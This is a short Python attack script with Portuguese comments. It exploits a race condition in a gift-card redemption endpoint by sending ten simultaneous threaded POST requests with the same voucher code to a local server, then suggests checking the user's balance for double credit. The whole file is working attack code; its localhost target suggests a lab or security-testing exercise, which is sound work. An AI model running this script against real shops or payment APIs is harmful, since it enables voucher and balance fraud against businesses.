# attack_race_condition.py
import requests
import threading

# --- CONFIGURAÇÃO ---
NUM_REQUESTS = 10  # Quantas vezes tentaremos resgatar o mesmo vale
TARGET_URL = "http://127.0.0.1:5000/giftcard/redeem"


headers = {
    'Content-Type': 'application/json',
    # 'Authorization': f'Bearer {JWT_TOKEN}'
}
body = {
    "code": "VALE50"
}

# --- FUNÇÃO DO ATACANTE ---
def make_request(req_num):
    """Função que cada thread irá executar."""
    print(f"Thread {req_num}: Enviando requisição...")
    try:
        response = requests.post(TARGET_URL, headers=headers, json=body)
        print(f"Thread {req_num}: Status={response.status_code}, Resposta={response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"Thread {req_num}: Erro na requisição - {e}")

# --- ORQUESTRADOR DO ATAQUE ---
print(f"Iniciando ataque com {NUM_REQUESTS} requisições simultâneas...")
threads = []
for i in range(NUM_REQUESTS):
    thread = threading.Thread(target=make_request, args=(i,))
    threads.append(thread)
    thread.start() 

for thread in threads:
    thread.join()

print("\nAtaque concluído!")

print("Verifique o saldo do usuário na API GET /me para ver o resultado.")

